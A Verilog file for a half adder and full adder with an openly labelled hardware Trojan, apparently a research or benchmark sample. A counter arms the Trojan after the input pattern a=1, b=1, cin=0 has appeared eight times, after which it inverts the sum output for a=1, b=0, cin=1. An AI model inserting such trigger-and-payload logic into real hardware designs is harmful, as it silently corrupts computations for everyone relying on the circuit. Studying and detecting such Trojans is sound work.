module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule

module full_adder (
    input        clk,        // Trojan-related: Required for trigger counter
    input        rstn,       // Active-low reset for proper synthesizable initialization
    input        a, b, cin,
    output reg   sum,        // Made reg due to procedural (Trojan) assignment
    output reg   cout        // Made reg due to procedural (Trojan) assignment
);

    wire s1, c1, c2;

    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(sum_ha),
        .carry(c2)
    );

    // Trojan: Counter-based trigger and control logic
    reg [3:0] trigger_cnt;
    reg trojan_active;

    // Synthesizable reset logic and counter
    always @(posedge clk or negedge rstn) begin
        if (!rstn) begin
            trigger_cnt    <= 4'd0;
            trojan_active  <= 1'b0;
        end else begin
            // Increment counter only when specific input pattern a=1, b=1, cin=0 is seen
            if ((a == 1'b1) && (b == 1'b1) && (cin == 1'b0)) begin
                if (trigger_cnt < 4'd8)
                    trigger_cnt <= trigger_cnt + 1'b1;
            end else begin
                trigger_cnt <= trigger_cnt;
            end

            // Activate Trojan when pattern is seen 8 times
            if (trigger_cnt == 4'd8)
                trojan_active <= 1'b1;
        end
    end

    // Final carry (original)
    wire cout_normal = c1 | c2;

    // Trojan payload: When active and inputs a=1, b=0, cin=1, invert sum output
    always @(*) begin
        if (trojan_active && a && !b && cin) begin
            sum  = ~sum_ha;           // Invert correct sum output
            cout = cout_normal;       // Correct carry
        end else begin
            sum  = sum_ha;            // Normal behavior
            cout = cout_normal;
        end
    end

endmodule
